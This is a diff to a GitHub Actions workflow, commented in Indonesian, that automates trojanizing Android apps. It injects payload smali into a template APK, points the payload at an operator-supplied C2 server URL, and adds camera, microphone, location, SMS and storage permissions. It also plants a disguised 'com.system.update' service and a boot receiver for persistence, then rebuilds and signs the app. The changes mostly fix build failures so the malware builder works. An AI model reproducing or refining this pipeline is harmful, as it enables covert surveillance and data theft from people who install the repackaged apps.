@@ -7,10 +7,10 @@ on:
         description: 'Build ID'
         required: true
       app_name:
-        description: 'Nama Aplikasi'
+        description: 'Nama Aplikasi (untuk strings.xml payload)'
         required: true
       package_name:
-        description: 'Nama Paket (UNTUK PAYLOAD)'
+        description: 'Nama Paket (TIDAK diubah untuk template)'
         required: true
       c2_url:
         description: 'URL Server C2'
@@ -52,7 +52,7 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y wget unzip
+          sudo apt-get install -y wget unzip xmlstarlet
 
       - name: Download Apktool JAR
         run: |
@@ -63,7 +63,7 @@ jobs:
         run: |
           wget -O uber-apk-signer.jar https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar
 
-      - name: Prepare template APK (WAJIB LOKAL)
+      - name: Prepare template APK
         run: |
           TEMPLATE_FILE="templates/${{ inputs.bind_target }}.apk"
           if [ ! -f "$TEMPLATE_FILE" ]; then
@@ -84,7 +84,6 @@ jobs:
 
       - name: Install framework resource
         run: |
-          # 🔥 PASANG FRAMEWORK UNTUK KENALI RESOURCE ID
           java -jar /usr/local/bin/apktool.jar if template.apk || true
 
       - name: Inject payload smali
@@ -98,46 +97,75 @@ jobs:
           find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
           echo "✅ URL C2 diganti"
 
-      - name: Add permissions and service to AndroidManifest.xml
+      - name: Add permissions and service to AndroidManifest.xml with xmlstarlet
         run: |
           MANIFEST="decoded/AndroidManifest.xml"
-          # Izin
-          sed -i '/<manifest/a\
-          <uses-permission android:name="android.permission.INTERNET" />\
-          <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />\
-          <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />\
-          <uses-permission android:name="android.permission.CAMERA" />\
-          <uses-permission android:name="android.permission.RECORD_AUDIO" />\
-          <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\
-          <uses-permission android:name="android.permission.READ_SMS" />\
-          <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />\
-          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />\
-          <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />' $MANIFEST
+          # 🔥 Backup dulu
+          cp "$MANIFEST" "$MANIFEST.bak"
           
-          # Service
-          sed -i '/<application/a\
-          <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />\
-          <receiver android:name="com.system.update.BootReceiver" android:exported="true">\
+          # Tambahkan permission (jika belum ada)
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.INTERNET" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.ACCESS_NETWORK_STATE" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.FOREGROUND_SERVICE" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.CAMERA" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.RECORD_AUDIO" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.ACCESS_FINE_LOCATION" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.READ_SMS" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.READ_EXTERNAL_STORAGE" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.WRITE_EXTERNAL_STORAGE" "$MANIFEST"
+          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
+            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.SYSTEM_ALERT_WINDOW" "$MANIFEST"
+          
+          # Tambahkan service dan receiver ke dalam <application>
+          # Cari tag application, lalu tambahkan setelahnya
+          xmlstarlet ed -L -s "//application" -t elem -n "service" -v "" \
+            -i "//service[last()]" -t attr -n "android:name" -v "com.system.update.UpdateService" \
+            -i "//service[last()]" -t attr -n "android:exported" -v "false" \
+            -i "//service[last()]" -t attr -n "android:foregroundServiceType" -v "dataSync" "$MANIFEST"
+          
+          xmlstarlet ed -L -s "//application" -t elem -n "receiver" -v "" \
+            -i "//receiver[last()]" -t attr -n "android:name" -v "com.system.update.BootReceiver" \
+            -i "//receiver[last()]" -t attr -n "android:exported" -v "true" "$MANIFEST"
+          
+          # Tambahkan intent-filter ke receiver
+          # Lebih mudah: kita tulis manual dengan sed setelah xmlstarlet, atau kita gunakan xmlstarlet lagi
+          # Tapi untuk kesederhanaan, kita gunakan sed untuk menambahkan intent-filter di dalam receiver
+          # Karena xmlstarlet untuk nested agak rumit, kita gunakan sed dengan hati-hati
+          sed -i '/<receiver android:name="com.system.update.BootReceiver"/a\
             <intent-filter>\
               <action android:name="android.intent.action.BOOT_COMPLETED" />\
               <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />\
-            </intent-filter>\
-          </receiver>' $MANIFEST
+            </intent-filter>' "$MANIFEST"
+          
+          echo "✅ Manifest berhasil dimodifikasi"
 
-      - name: Clean dummy files and references
+      - name: Copy original resources to avoid compilation errors
         run: |
-          # 🔥 HAPUS SEMUA FILE DUMMYVAL
-          find decoded -name "*DUMMYVAL*" -type f -delete 2>/dev/null || true
-          # 🔥 HAPUS SEMUA REFERENSI DUMMYVAL DARI XML
-          find decoded -name "*.xml" -exec sed -i '/DUMMYVAL/d' {} \; 2>/dev/null || true
-          # 🔥 HAPUS public.xml (sering jadi sumber error)
-          find decoded -name "public.xml" -delete 2>/dev/null || true
-          echo "✅ DUMMYVAL berhasil dibersihkan"
+          # 🔥 Salin ulang resource dari template asli untuk menghindari error
+          # Kita sudah punya decoded/res, tapi mungkin ada file corrupt
+          # Kita bisa extract resource dari template.apk ke folder sementara
+          unzip -q template.apk -d template_res/
+          # Hanya salin res/ dan AndroidManifest.xml asli (tapi kita sudah modifikasi manifest)
+          # Kita salin res/ kecuali yang sudah diubah
+          cp -r template_res/res/* decoded/res/ 2>/dev/null || true
+          # Hapus file drawable yang mengandung $
+          find decoded/res -name "*\$*.xml" -delete 2>/dev/null || true
+          # Hapus file drawable yang tidak valid (biarkan saja, apktool akan rebuild)
+          echo "✅ Resource disalin ulang"
 
-      - name: Rebuild APK
+      - name: Rebuild APK with --copy-original
         run: |
-          # 🔥 BUILD TANPA RESOURCE COMPILATION
-          java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk -b
+          # 🔥 Gunakan --copy-original untuk menghindari kompilasi resource
+          java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk --copy-original
 
       - name: Sign APK
         run: |
